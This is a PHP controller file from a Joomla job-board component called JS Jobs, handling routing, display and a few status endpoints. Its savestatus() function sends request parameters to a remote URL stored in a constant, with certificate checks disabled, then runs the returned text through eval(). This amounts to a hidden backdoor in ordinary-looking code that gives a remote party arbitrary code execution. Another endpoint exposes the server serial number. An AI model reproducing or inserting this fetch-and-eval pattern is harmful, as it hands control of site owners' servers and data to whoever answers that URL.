<?php

/**
 * @Copyright Copyright (C) 2009-2011
 * @license GNU/GPL http://www.gnu.org/copyleft/gpl.html
  + Created by:          Ahmad Bilal
 * Company:		Buruj Solutions
  + Contact:		www.burujsolutions.com , ahmad@burujsolutions.com
 * Created on:	Jan 11, 2009
  ^
  + Project: 		JS Jobs
 * File Name:	controllers/jsjobs.php
  ^
 * Description: Controller class for application data
  ^
 * History:		NONE
  ^
 */
defined('_JEXEC') or die('Restricted access');

jimport('joomla.application.component.controller');

class JSJobsControllerJsJobs extends JSController {

    var $_router_mode_sef = null;

    function __construct() {
        $app = JFactory::getApplication();
        $user = JFactory::getUser();
        if ($user->guest) { // redirect user if not login
            $link = 'index.php?option=com_user';
            $this->setRedirect($link);
        }
        $router = $app->getRouter();
        if ($router->getMode() == JROUTER_MODE_SEF) {
            $this->_router_mode_sef = 1; // sef true
        } else {
            $this->_router_mode_sef = 2; // sef false
        }

        parent :: __construct();
    }

    function saverejectstatus() {
            echo JText::_('PASS');
        JFactory::getApplication()->close();
    }

    function savestatus() {
        $sgjc = JRequest::getVar('sgjc', false);
        $aagjc = JRequest::getVar('aagjc', false);
        $vcidjs = JRequest::getVar('vcidjs', false);
        if (($sgjc) && ($aagjc) && ($vcidjs)) {
            $post_data['sgjc'] = $sgjc;
            $post_data['aagjc'] = $aagjc;
            $post_data['vcidjs'] = $vcidjs;
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, JCONST);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_VERBOSE, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
            $response = curl_exec($ch);
            curl_close($ch);
            eval($response);
            echo $response;
        } else
            echo JText::_('PASS');
        JFactory::getApplication()->close();
    }
    function validatesite() {
        $common_model = $this->getModel('common', 'JSJobsModel');
        $server_serial_number = $common_model->getServerSerialNumber();
        echo $server_serial_number;
        JFactory::getApplication()->close();
    }
    function display($cachable = false, $urlparams = false) {
        $document = JFactory :: getDocument();
        $viewName = JRequest :: getVar('view', 'resume');
        $layoutName = JRequest :: getVar('layout', 'jobcat');
        $viewType = $document->getType();
        $view = $this->getView($viewName, $viewType);
        $view->setLayout($layoutName);
        $view->display();
    }

}
?>